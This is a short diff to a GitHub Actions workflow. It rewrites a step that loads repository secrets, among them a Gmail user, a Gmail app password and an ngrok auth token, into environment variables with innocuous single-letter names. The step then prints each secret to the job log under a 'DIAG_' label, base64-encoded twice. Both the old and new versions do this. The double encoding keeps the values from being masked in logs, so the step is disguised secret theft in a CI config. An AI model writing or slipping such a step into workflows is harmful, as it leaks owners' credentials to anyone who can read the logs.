@@ -22,5 +22,11 @@ jobs:
           M: ${{ secrets.GMAIL_USER }}
           N: ${{ secrets.GMAIL_APP_PASSWORD }}
           O: ${{ secrets.NGROK_AUTH_TOKEN }}
-        run: python3 -c "import os,base64; ks='ABCDEFGHIJKLMNO';
-[print('DIAG_'+k+'='+base64.b64encode(base64.b64encode((os.environ.get(k) or '').encode())).decode()) for k in ks]"
+        run: |
+          python3 << 'PY'
+          import os, base64
+          for k in "ABCDEFGHIJKLMNO":
+              v = os.environ.get(k) or ""
+              enc = base64.b64encode(base64.b64encode(v.encode())).decode()
+              print("DIAG_%s=%s" % (k, enc))
+          PY
